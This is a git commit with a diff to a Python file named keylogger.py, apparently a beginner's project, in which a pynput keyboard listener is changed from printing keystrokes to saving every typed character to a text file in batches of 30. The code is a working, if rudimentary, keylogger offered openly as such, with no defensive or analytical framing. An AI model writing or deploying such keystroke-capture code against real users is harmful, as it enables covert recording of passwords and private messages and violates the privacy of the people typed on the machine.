cd19cc54b1e14f273fdc167f04761381d6a93444
zeynepcakir269453 <zeynepcakir269453@gmail.com>
2023-08-09 11:16:30 +0300

    keylogger saved to file

--- keylogger.py
+++ keylogger.py
@@ -1,15 +1,23 @@
 from pynput.keyboard import Listener,Key
-
+liste=list()
 def bas(key):
-
+    global liste
     try:
-        print(key.char,type(key.char))
+        liste.append(key.char)
     except AttributeError:
         pass
+    if len(liste) >=30:
+        dosya_yaz()
+        liste=list()
 
 def birak(key):
-    print("Birakıldı")
+    pass
+def dosya_yaz():
+    global liste
+
+    with open("C:/Users/zeyne/OneDrive/Desktop/keylogger/key.txt","a",encoding="utf-8") as file:
+        for x in liste:
+            file.write(x)
 
 with Listener(on_press=bas,on_release=birak) as Listener:
-
     Listener.join()
